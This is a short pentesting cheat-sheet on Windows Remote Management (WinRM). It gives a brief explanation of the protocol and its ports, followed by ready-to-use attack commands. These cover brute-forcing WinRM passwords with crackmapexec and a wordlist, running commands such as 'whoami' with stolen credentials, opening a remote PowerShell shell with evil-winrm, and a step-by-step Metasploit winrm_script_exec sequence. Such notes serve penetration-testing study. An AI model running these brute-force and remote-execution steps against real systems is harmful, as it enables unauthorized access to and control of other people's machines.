# WinRM

# Explanation

- Windows Remote Management Protocol (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems.

- Microsoft implemented WinRM in to Windows in order to make life easier for system administrators.

- WinRM is tipically used in the following ways : 
    - Remotely access and interact with Windows hosts on a local network.
    - Remotely access and execute commands on Windows systems.
    - Manage and configure Windows systems remotely.

- WinRM tipically uses TCP port 5985 and 5986 (HTTPS).

- WinRM implements access control and security for communication between systems through various forms of authentication.

# Brute force attack

```
crackmapexec winrm <target> -u <user> -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

# RCE with valid account

## Crackmapexec

```
crackmapexec winrm <target> -u <user> -p <password> -x "whoami"
crackmapexec winrm <target> -u <user> -p <password> -x "systeminfo"
```

## Remote PowerShell shell with Evil-Winrm

```
evil-winrm.rb -u <user> -p 'password' -i <target>
```

## Metasploit framework

```
service postgresql start && msfconsole
msf6> search winrm_script
msf6> use exploit/windows/winrm/winrm_script_exec
msf6> set RHOSTS <target>
msf6> set USERNAME <user>
msf6> set PASSWORD <password>
msf6> set FORCE_VBS true
msf6> run
```
